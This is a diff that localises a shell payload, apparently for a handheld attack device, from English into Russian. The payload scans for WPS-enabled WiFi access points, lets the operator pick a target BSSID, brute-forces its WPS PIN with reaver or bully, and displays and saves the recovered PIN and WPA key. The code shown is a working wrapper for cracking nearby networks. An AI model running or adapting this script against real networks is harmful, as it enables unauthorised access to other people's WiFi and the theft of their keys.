@@ -8,23 +8,22 @@
 LOOT_DIR="/mmc/nullsec/wpsbrute"
 mkdir -p "$LOOT_DIR"
 
-PROMPT "WPS BRUTEFORCE
+PROMPT "ПЕРЕБОР WPS
 
-Brute force WPS PINs
-to recover WiFi keys.
+Перебирайте PIN-коды WPS
+для восстановления ключей.
 
-Features:
-- Reaver PIN attack
-- Bully PIN attack
-- Pixie Dust (offline)
-- Custom PIN list
-- Auto-target selection
+Возможности:
+- Атака Reaver PIN
+- Атака Bully PIN
+- Pixie Dust (оффлайн)
+- Собств. список PIN
+- Автоопределение целей
 
-WARNING: Active attack
-May take hours for
-full brute force.
+ВНИМАНИЕ: Активная атака
+Может занять часы.
 
-Press OK to configure."
+Нажмите OK для настройки."
 
 # Check for attack tools
 HAS_REAVER=0
@@ -33,9 +32,9 @@ command -v reaver >/dev/null 2>&1 && HAS_REAVER=1
 command -v bully >/dev/null 2>&1 && HAS_BULLY=1
 
 if [ $HAS_REAVER -eq 0 ] && [ $HAS_BULLY -eq 0 ]; then
-    ERROR_DIALOG "No WPS tools found!
+    ERROR_DIALOG "Инструменты WPS не найдены!
 
-Install reaver or bully:
+Установите reaver или bully:
 opkg install reaver
 opkg install bully"
     exit 1
@@ -48,30 +47,30 @@ for iface in wlan1mon wlan2mon mon0; do
 done
 
 if [ -z "$MONITOR_IF" ]; then
-    ERROR_DIALOG "No monitor interface!
+    ERROR_DIALOG "Нет интерфейса монитор!
 
-Enable monitor mode:
+Включите режим монитор:
 airmon-ng start wlan1"
     exit 1
 fi
 
-PROMPT "ATTACK MODE:
+PROMPT "РЕЖИМ АТАКИ:
 
-1. Pixie Dust (fast)
-2. PIN brute force
-3. Known PINs list
-4. Null PIN test
+1. Pixie Dust (быстро)
+2. Перебор PIN-кодов
+3. Известные PIN-коды
+4. Тест NULL PIN
 
-Tools: $([ $HAS_REAVER -eq 1 ] && echo "reaver ")$([ $HAS_BULLY -eq 1 ] && echo "bully")
-Monitor: $MONITOR_IF
+Инструменты: $([ $HAS_REAVER -eq 1 ] && echo "reaver ")$([ $HAS_BULLY -eq 1 ] && echo "bully")
+Монитор: $MONITOR_IF
 
-Выберите следующий режим."
+Выберите режим."
 
 ATTACK_MODE=$(NUMBER_PICKER "Режим (1-4):" 1)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac
 
 # Scan for WPS targets
-SPINNER_START "Scanning for WPS APs..."
+SPINNER_START "Сканирование точек WPS..."
 
 SCAN_FILE="/tmp/wps_scan_$$.txt"
 if command -v wash >/dev/null 2>&1; then
@@ -83,18 +82,18 @@ fi
 SPINNER_STOP
 
 TARGET_COUNT=$(wc -l < "$SCAN_FILE" 2>/dev/null | tr -d ' ')
-[ "$TARGET_COUNT" = "0" ] && { ERROR_DIALOG "No WPS-enabled APs found!"; rm -f "$SCAN_FILE"; exit 1; }
+[ "$TARGET_COUNT" = "0" ] && { ERROR_DIALOG "Точки WPS не найдены!"; rm -f "$SCAN_FILE"; exit 1; }
 
 TARGET_LIST=$(head -8 "$SCAN_FILE" | awk '{print NR". "$1" "$6}')
 
-PROMPT "WPS TARGETS: $TARGET_COUNT
+PROMPT "ЦЕЛИ WPS: $TARGET_COUNT
 
 $TARGET_LIST
 
-Select target next.
-Enter BSSID of target."
+Выберите цель.
+Введите BSSID цели."
 
-TARGET_BSSID=$(TEXT_PICKER "Target BSSID:" "$(head -1 "$SCAN_FILE" | awk '{print $1}')")
+TARGET_BSSID=$(TEXT_PICKER "BSSID цели:" "$(head -1 "$SCAN_FILE" | awk '{print $1}')")
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) rm -f "$SCAN_FILE"; exit 0 ;; esac
 
 TARGET_CHANNEL=$(grep "$TARGET_BSSID" "$SCAN_FILE" | awk '{print $2}')
@@ -102,13 +101,13 @@ TARGET_CHANNEL=${TARGET_CHANNEL:-6}
 
 # Tool selection
 if [ $HAS_REAVER -eq 1 ] && [ $HAS_BULLY -eq 1 ]; then
-    PROMPT "SELECT TOOL:
+    PROMPT "ВЫБЕРИТЕ ИНСТРУМЕНТ:
 
 1. Reaver
 2. Bully
 
-Select tool next."
-    TOOL_PICK=$(NUMBER_PICKER "Tool (1-2):" 1)
+Выберите инструмент."
+    TOOL_PICK=$(NUMBER_PICKER "Инструмент (1-2):" 1)
     case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TOOL_PICK=1 ;; esac
     [ "$TOOL_PICK" = "2" ] && USE_TOOL="bully" || USE_TOOL="reaver"
 elif [ $HAS_REAVER -eq 1 ]; then
@@ -117,27 +116,27 @@ else
     USE_TOOL="bully"
 fi
 
-TIMEOUT_MIN=$(NUMBER_PICKER "Timeout (minutes):" 60)
+TIMEOUT_MIN=$(NUMBER_PICKER "Тайм-аут (мин):" 60)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TIMEOUT_MIN=60 ;; esac
 
-resp=$(CONFIRMATION_DIALOG "START WPS ATTACK?
+resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ WPS?
 
-Target: $TARGET_BSSID
-Channel: $TARGET_CHANNEL
-Tool: $USE_TOOL
+Цель: $TARGET_BSSID
+Канал: $TARGET_CHANNEL
+Инструмент: $USE_TOOL
 Режим: $ATTACK_MODE
-Timeout: ${TIMEOUT_MIN}m
+Тайм-аут: ${TIMEOUT_MIN}м
 
-This is an active attack.
+Это активная атака.
 
-Confirm?")
+Подтвердить?")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f "$SCAN_FILE"; exit 0; }
 
 TIMESTAMP=$(date +%Y%m%d_%H%M)
 OUTPUT_FILE="$LOOT_DIR/wps_${TARGET_BSSID//:/}_$TIMESTAMP.log"
 
-LOG "Starting WPS attack on $TARGET_BSSID..."
-SPINNER_START "Attacking WPS PIN..."
+LOG "Запуск атаки WPS на $TARGET_BSSID..."
+SPINNER_START "Атака на PIN-коды WPS..."
 
 TIMEOUT_SEC=$((TIMEOUT_MIN * 60))
 
@@ -183,17 +182,17 @@ ATTACK_PID=$!
 
 SPINNER_STOP
 
-PROMPT "WPS ATTACK RUNNING
+PROMPT "АТАКА WPS В ПРОЦЕССЕ
 
-Target: $TARGET_BSSID
-Tool: $USE_TOOL
-Timeout: ${TIMEOUT_MIN}m
+Цель: $TARGET_BSSID
+Инструмент: $USE_TOOL
+Тайм-аут: ${TIMEOUT_MIN}м
 
-Logging to:
+Журнал:
 $OUTPUT_FILE
 
-Press OK to wait for
-completion or timeout."
+Нажмите OK для ожидания
+иходов или тайм-аута."
 
 # Wait for attack
 wait $ATTACK_PID 2>/dev/null
@@ -206,40 +205,40 @@ ATTEMPTS=$(grep -c "Trying pin" "$OUTPUT_FILE" 2>/dev/null)
 rm -f "$SCAN_FILE"
 
 if [ -n "$WPA_KEY" ]; then
-    PROMPT "WPS CRACKED!
+    PROMPT "WPS ВЗЛОМАН!
 
 $WPS_PIN
 $WPA_KEY
 
-Target: $TARGET_BSSID
-Attempts: $ATTEMPTS
+Цель: $TARGET_BSSID
+Попыток: $ATTEMPTS
 
-Saved: $OUTPUT_FILE
+Сохранено: $OUTPUT_FILE
 
-Press OK to exit."
+Нажмите OK для выхода."
 elif [ -n "$WPS_PIN" ]; then
-    PROMPT "PIN FOUND!
+    PROMPT "PIN НАЙДЕН!
 
 $WPS_PIN
-(Key not recovered)
+(Ключ не восстановлен)
 
-Target: $TARGET_BSSID
-Attempts: $ATTEMPTS
+Цель: $TARGET_BSSID
+Попыток: $ATTEMPTS
 
-Saved: $OUTPUT_FILE
+Сохранено: $OUTPUT_FILE
 
-Press OK to exit."
+Нажмите OK для выхода."
 else
-    PROMPT "ATTACK COMPLETE
+    PROMPT "АТАКА ЗАВЕРШЕНА
 
-No PIN found.
-Attempts: $ATTEMPTS
+PIN не найден.
+Попыток: $ATTEMPTS
 
-Target may have WPS
-lockout enabled or
-rate limiting.
+Цель может иметь
+блокировку WPS или
+ограничение скорости.
 
 Журнал: $OUTPUT_FILE
 
-Press OK to exit."
+Нажмите OK для выхода."
 fi
